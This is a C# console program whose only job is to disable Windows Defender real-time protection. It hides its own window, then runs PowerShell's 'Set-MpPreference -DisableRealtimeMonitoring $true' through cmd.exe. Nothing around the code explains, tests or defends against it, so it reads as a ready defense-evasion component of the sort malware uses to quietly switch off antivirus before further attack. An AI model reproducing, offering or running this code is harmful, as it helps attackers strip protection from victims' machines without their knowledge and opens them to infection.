using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace TurnOffDefenderRealTimeProtection
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void Main(string[] args)
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);

            System.Threading.Thread.Sleep(1);

            string fileName = "cmd.exe";

            var commands = new string[] { "powershell.exe", "Set-MpPreference -DisableRealtimeMonitoring $true" ,"exit" };

            ProcessHelper.ExecuteCommands(fileName, "", commands, Process_ErrorDataReceived);
        }

        private static void Process_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                Console.WriteLine(e.Data);
            }
        }
    }
}
